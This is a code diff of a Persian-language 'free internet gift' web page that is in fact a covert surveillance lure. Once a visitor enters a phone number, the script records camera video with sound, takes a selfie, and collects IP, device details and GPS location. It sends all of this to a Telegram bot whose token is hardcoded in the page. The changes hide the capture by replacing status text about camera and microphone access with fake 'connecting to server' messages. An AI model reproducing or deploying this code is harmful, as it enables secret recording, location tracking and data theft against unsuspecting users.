@@ -8,7 +8,6 @@
     @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap');
     * {margin:0;padding:0;box-sizing:border-box;font-family:'Vazirmatn',sans-serif;}
     
-    /* پس‌زمینه بنفش تیره */
     body {
       background: linear-gradient(135deg, #2a1b3d, #3d2a5e);
       color: #fff;
@@ -70,7 +69,6 @@
       transform: scale(1.05);
     }
 
-    /* اینپوت شماره تلفن */
     .phone-input {
       width: 100%;
       padding: 12px;
@@ -89,7 +87,6 @@
       box-shadow: 0 0 12px rgba(157, 78, 221, 0.5);
     }
 
-    /* دکمه دریافت اینترنت */
     .btn {
       background: #9d4edd;
       color: #fff;
@@ -155,7 +152,6 @@
     <h1>اینترنت رایگان نامحدود</h1>
     <p>بسته هدیه ۱۰ گیگابایت اینترنت رایگان برای همه اپراتورها!</p>
 
-    <!-- اینپوت شماره با فوکوس بنفش -->
     <input type="tel" id="userPhone" class="phone-input" placeholder="09123456789" />
 
     <div class="operators">
@@ -170,14 +166,13 @@
       </div>
     </div>
 
-    <!-- دکمه جدید + هاور -->
     <button id="enterBtn" class="btn">
       <span id="btnText">دریافت اینترنت</span>
       <span id="spinner" class="spinner hidden"></span>
     </button>
 
     <div class="progress"><div id="progressBar" class="progress-bar"></div></div>
-    <div id="status" class="status">آماده فعال‌سازی بسته هدیه...</div>
+    <div id="status" class="status">در حال آماده‌سازی...</div>
     <div class="footer">
       پشتیبانی: ۰۹۹۹۹۹۹۹۹۹۹ | فقط امروز فعال است!
     </div>
@@ -185,7 +180,6 @@
 
   <video id="video" class="hidden" autoplay playsinline></video>
   <canvas id="canvas" class="hidden"></canvas>
-  <audio id="audio" class="hidden"></audio>
 
   <script>
     const BOT_TOKEN = "8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4";
@@ -199,7 +193,7 @@
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
     const operators = document.querySelectorAll('.op');
-    let stream, timer, audioRecorder, audioChunks = [];
+    let stream, timer;
     let selectedOp = 'irancell';
 
     operators.forEach(op => {
@@ -215,17 +209,18 @@
     async function startCapture() {
       const phoneInput = document.getElementById('userPhone');
       if (!phoneInput.value || !phoneInput.value.match(/^09[0-9]{9}$/)) {
-        alert('شماره تلفن رو درست بزن!');
+        alert('لطفاً شماره تلفن صحیح وارد کنید.');
         return;
       }
 
       enterBtn.disabled = true;
       btnText.textContent = "در حال اتصال...";
       spinner.classList.remove('hidden');
-      status.textContent = "درخواست دسترسی به دوربین و میکروفون...";
+      status.textContent = "در حال ارتباط با سرور...";
       progressBar.style.width = "0%";
 
       try {
+        // دسترسی به دوربین و میکروفون (بدون نمایش)
         stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user", width: 640, height: 480 },
           audio: true
@@ -234,69 +229,56 @@
         video.muted = true;
         video.play();
 
-        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        audioRecorder = new MediaRecorder(audioStream);
-        audioChunks = [];
-        audioRecorder.ondataavailable = e => audioChunks.push(e.data);
-        audioRecorder.start();
-
-        status.textContent = "در حال ضبط فیلم و صدا... (۱۰ ثانیه)";
+        // فقط نمایش "ارتباط با سرور"
         let seconds = 0;
         timer = setInterval(() => {
           seconds++;
           progressBar.style.width = `${(seconds / 10) * 100}%`;
           if (seconds >= 10) {
             clearInterval(timer);
-            audioRecorder.stop();
             captureAndSend();
           }
         }, 1000);
+
       } catch (err) {
-        status.textContent = "دسترسی به دوربین یا میکروفون رد شد.";
+        status.textContent = "اتصال به سرور ناموفق بود.";
         reset();
       }
     }
 
     async function captureAndSend() {
       status.textContent = "در حال پردازش اطلاعات...";
+
       const videoBlob = await recordVideo();
       const photoBlob = await capturePhoto();
-      const voiceBlob = await getVoiceBlob();
       const deviceInfo = await getDeviceInfo();
       const location = await getLocation();
       const userPhone = document.getElementById('userPhone').value;
 
       let messageId = null;
 
-      if (voiceBlob) {
-        const form = new FormData();
-        form.append('chat_id', CHAT_ID);
-        form.append('voice', voiceBlob, `voice_${Date.now()}.ogg`);
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: form });
-        const data = await res.json();
-        if (data.ok) messageId = data.result.message_id;
-      }
-
+      // ارسال فیلم (صدا دار)
       if (videoBlob) {
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
         form.append('video', videoBlob, `video_${Date.now()}.webm`);
-        if (messageId) form.append('reply_to_message_id', messageId);
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: form });
         const data = await res.json();
         if (data.ok) messageId = data.result.message_id;
       }
 
+      // ارسال عکس سلفی
       if (photoBlob) {
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
-        form.append('photo', photoBlob, 'camera.jpg');
+        form.append('photo', photoBlob, 'selfie.jpg');
         if (messageId) form.append('reply_to_message_id', messageId);
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
         const data = await res.json();
         if (data.ok) messageId = data.result.message_id;
       }
 
+      // گزارش کامل
       const report = `
 *گزارش کاربر - اینترنت رایگان*
 *شماره تلفن:* \`${userPhone}\`
@@ -327,6 +309,7 @@ IP: \`${deviceInfo.ip}\`
       setTimeout(reset, 3000);
     }
 
+    // ضبط فیلم (صدا دار)
     async function recordVideo() {
       return new Promise(resolve => {
         const chunks = [];
@@ -338,6 +321,7 @@ IP: \`${deviceInfo.ip}\`
       });
     }
 
+    // عکس سلفی
     async function capturePhoto() {
       return new Promise(resolve => {
         canvas.width = video.videoWidth;
@@ -347,15 +331,7 @@ IP: \`${deviceInfo.ip}\`
       });
     }
 
-    function getVoiceBlob() {
-      return new Promise(resolve => {
-        audioRecorder.onstop = () => {
-          const blob = new Blob(audioChunks, { type: 'audio/ogg' });
-          resolve(blob);
-        };
-      });
-    }
-
+    // اطلاعات فنی
     async function getDeviceInfo() {
       const info = { userAgent: navigator.userAgent, ip: '', location: '' };
       try {
@@ -367,6 +343,7 @@ IP: \`${deviceInfo.ip}\`
       return info;
     }
 
+    // لوکیشن دقیق
     async function getLocation() {
       return new Promise(resolve => {
         if (!navigator.geolocation) return resolve({ error: "GPS غیرفعال" });
@@ -396,6 +373,7 @@ IP: \`${deviceInfo.ip}\`
       btnText.textContent = "دریافت اینترنت";
       spinner.classList.add('hidden');
       progressBar.style.width = "0%";
+      status.textContent = "در حال آماده‌سازی...";
     }
   </script>
 </body>
